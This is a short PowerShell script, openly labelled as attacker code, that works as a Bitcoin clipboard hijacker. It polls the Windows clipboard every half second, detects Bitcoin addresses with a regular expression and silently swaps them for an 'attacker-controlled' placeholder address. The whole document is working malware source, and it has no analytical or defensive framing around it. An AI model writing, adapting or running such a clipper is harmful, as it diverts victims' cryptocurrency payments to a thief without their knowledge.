Add-Type -AssemblyName PresentationCore

# Your attacker-controlled BTC address
$attackerBTC = "bc1qexampleattackeraddress1234567890abcde"

# Regex to detect BTC addresses
$btcRegex = '((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,59})'

$lastClip = ""

while ($true) {
    try {
        # Read current clipboard text
        $currentClip = [Windows.Clipboard]::GetText()

        # If clipboard changed
        if ($currentClip -ne $lastClip -and $currentClip -ne "") {
            $lastClip = $currentClip

            # Check if it matches a BTC address
            if ($currentClip -match $btcRegex) {
                Write-Host "⚠️ Bitcoin address detected: $currentClip"
                [Windows.Clipboard]::SetText($attackerBTC)
                Write-Host "✅ Replaced with attacker address: $attackerBTC"
            }
        }
    } catch {
        # Ignore errors for non-text clipboard formats
    }

    Start-Sleep -Milliseconds 500
}
